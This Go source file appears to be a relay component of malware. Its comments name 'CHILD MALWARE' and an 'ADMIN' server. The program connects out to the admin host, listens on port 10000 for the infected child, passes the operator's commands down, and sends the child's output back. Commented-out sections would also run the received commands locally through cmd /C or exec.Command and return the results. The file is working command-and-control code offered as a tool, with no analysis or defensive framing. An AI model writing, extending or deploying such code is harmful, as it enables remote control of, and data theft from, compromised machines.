package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"runtime"
	"strings"
)

func OSCheck() string {
	var OSShell string
	if runtime.GOOS == "windows" {
		fmt.Println("OS identified as Windows")
		//command =
		OSShell = "windows"
		// err := ni

	} else if runtime.GOOS == "linux" {
		fmt.Println("OS identified as: Linux")
		OSShell = "linux"

	}
	return OSShell

}

func main() {

	//manual connection to ADMIN server
	arguments := os.Args
	if len(arguments) == 1 {
		fmt.Println("Please provide host:port.")
		return
	}

	CONNECT := arguments[1]
	c, err := net.Dial("tcp", CONNECT)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("CONNECTED TO ADMIN, waiting on CHILD")
	// this may need to be a go routine
	defer c.Close()
	//======

	//CONNECTION TO CHILD MALWARE
	fmt.Println("CREATING SERVER FOR CHILD")
	PORT := ":10000"
	l2, err := net.Listen("tcp", PORT)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer l2.Close()

	//server connection for child to connect to.
	//connection on port 10000
	fmt.Println("SERVER ESTABLISHED ON: " + PORT + " WAITING FOR CHILD TO CONNECT")
	c2, err := l2.Accept()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("CHILD connected on", PORT)
	// fmt.Println("server establed on", PORT)

	//server connection for child to connect to.
	//connection on port 10000

	for {

		//var results string
		//Reading in ADMIN COMMAND
		commandString, _ := bufio.NewReader(c).ReadString('\n')
		fmt.Print("COMMAND RECEIVED FROM ADMIN->: " + commandString)
		if strings.TrimSpace(string(commandString)) == "STOP" {
			fmt.Println("TCP client exiting...")
			break
		}
		// //EXECUTING COMMAND ON CORRECT OS  FOR PARENT
		// checkOS := OSCheck()
		// if checkOS == "windows" {
		// 	// fmt.Println("WINDOWS")
		// 	CommandExec, err := exec.Command("cmd", "/C", commandString).Output()
		// 	if err != nil {
		// 		fmt.Println("Error executing command", err)
		// 		c.Write([]byte("unable to execute command"))
		// 		continue
		// 	}
		// 	CommandExec2 := string(CommandExec)
		// 	results = strings.TrimSpace(CommandExec2)
		// 	// fmt.Println(reflect.TypeOf(CommandExec))
		// 	// fmt.Println(reflect.TypeOf(err))

		// } else if checkOS == "linux" {
		// 	// fmt.Println("LINUX")
		// 	//fmt.Println("XS", command)
		// 	CommandExec, err := exec.Command(strings.TrimSpace(commandString)).Output()
		// 	if err != nil {
		// 		fmt.Println("Error executing command", err)
		// 		c.Write([]byte("unable to execute command"))
		// 		continue
		// 	}
		// 	CommandExec2 := string(CommandExec) // need for commands on linux - remove \r\n
		// 	results = strings.TrimSpace(CommandExec2)
		// }
		// // fmt.Println(results2)
		// // results2 := [...]string{results, "END"}
		// //writing
		// // fmt.Fprintf(c, results2)

		// //SENDING RESULTS TO ADMIN
		// results2 := results
		// fmt.Println(results2)
		//c.Write([]byte("FROM PARENT-> " + results2))
		//fmt.Fprintf(c, results2)

		//Sending Command to Child
		text := commandString
		fmt.Fprintf(c2, text+"\n")

		if strings.TrimSpace(string(text)) == "STOP" {
			fmt.Println("Closing TCP server!")
			return
		}
		buf := make([]byte, 4096)
		//reading data from child
		len, err := c2.Read(buf)

		if err != nil {
			fmt.Println("Error reading:", err.Error())
			break
		}

		s := string(buf[:len])

		// fmt.Println("FROM CHILD->", s)
		//writing to ADMIN
		c.Write([]byte("FROM CHILD-> " + s))

		//end of main for loop
	}

}
